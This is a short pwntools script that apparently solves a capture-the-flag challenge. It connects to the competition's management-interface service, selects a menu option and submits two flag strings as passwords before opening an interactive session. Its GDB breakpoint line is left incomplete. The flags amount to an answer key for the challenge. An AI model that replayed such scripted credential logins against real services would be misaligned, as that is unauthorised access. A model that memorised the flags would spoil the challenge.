from pwn import *


# Set up pwntools for the correct architecture
executable = context.binary = ELF ('./main')


host = "mngmnt-iface.ctfcompetition.com"
port = 1337

# GDB scripts
gdbscript = '''
break *0x
continue
'''.format(**locals())

# Execute the target binary locally
def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([executable.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([executable.path] + argv, *a, **kw)

# Connect to remote process
def remote():

    connection = connect(host, port)
    if args.GDB:
        gdb.attach(connection, gdbscript=gdbscript)
    return connection
    
start = local if args.LOCAL else remote

# Exploit here
connection = start()

# Printing out messeage from server
print(connection.recv())
print(connection.recv())

connection.sendline("1")

print(connection.recv())
print(connection.recv())

connection.sendline("CTF{I_luv_buggy_sOFtware}")

print(connection.recv())
print(connection.recv())

connection.sendline("CTF{Two_PasSworDz_Better_th4n_1_k?}")

print(connection.recv())
print(connection.recv())

connection.interactive()


